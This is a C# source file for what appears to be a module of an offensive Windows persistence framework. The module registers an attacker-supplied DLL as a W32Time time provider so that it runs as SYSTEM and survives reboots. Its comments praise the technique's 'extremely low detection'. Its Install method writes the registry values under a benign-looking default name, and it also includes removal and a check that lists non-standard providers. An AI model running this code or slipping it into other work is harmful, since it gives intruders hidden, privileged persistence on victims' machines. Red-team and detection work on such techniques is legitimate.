using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Time Provider DLL Persistence (T1547.003)
    ///
    /// W32Time service loads DLLs registered as time providers. Runs as SYSTEM,
    /// survives reboots. Extremely low detection - security tools almost never
    /// monitor the TimeProviders registry subkeys.
    ///
    /// Registry: HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\[Name]
    ///   DllName = path, Enabled = 1, InputProvider = 0
    ///
    /// Restart W32Time to load without full reboot.
    /// </summary>
    public class TimeProviderDll : ITendril
    {
        public string Name { get { return "TimeProviderDll"; } }
        public string Description { get { return "W32Time time provider DLL - SYSTEM exec, very low detection profile"; } }
        public string MitreId { get { return "T1547.003"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string TimePath = @"SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, name;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<dll_path>");
            if (!options.TryGetValue("name", out name))
                name = "NtpClientSync";

            string keyPath = TimePath + @"\" + name;
            RegistryUtils.SetRegValue("HKLM", keyPath, "DllName", payload);
            RegistryUtils.SetRegDword("HKLM", keyPath, "Enabled", 1);
            RegistryUtils.SetRegDword("HKLM", keyPath, "InputProvider", 0);

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Time provider registered: {0} -> {1}", name, payload))
                .WithMeta("Provider", name)
                .WithMeta("DLL", payload)
                .WithMeta("Note", "Restart W32Time service or reboot to load.");
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string name;
            if (!options.TryGetValue("name", out name))
                name = "NtpClientSync";

            RegistryUtils.DeleteRegKeyTree("HKLM", TimePath + @"\" + name);
            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Time provider removed: {0}", name));
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            var known = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "NtpClient", "NtpServer"
            };

            string[] providers = RegistryUtils.GetRegSubkeys("HKLM", TimePath);
            foreach (string prov in providers)
            {
                if (known.Contains(prov)) continue;
                string dll = RegistryUtils.GetRegValue("HKLM", TimePath + @"\" + prov, "DllName");
                string enabled = RegistryUtils.GetRegValue("HKLM", TimePath + @"\" + prov, "Enabled");
                if (!string.IsNullOrEmpty(dll))
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("Non-standard time provider: {0} -> {1} (enabled={2})", prov, dll, enabled ?? "?"))
                        .WithMeta("Provider", prov)
                        .WithMeta("DLL", dll)
                        .WithMeta("Enabled", enabled ?? "unknown"));
                }
            }
            return results;
        }
    }
}
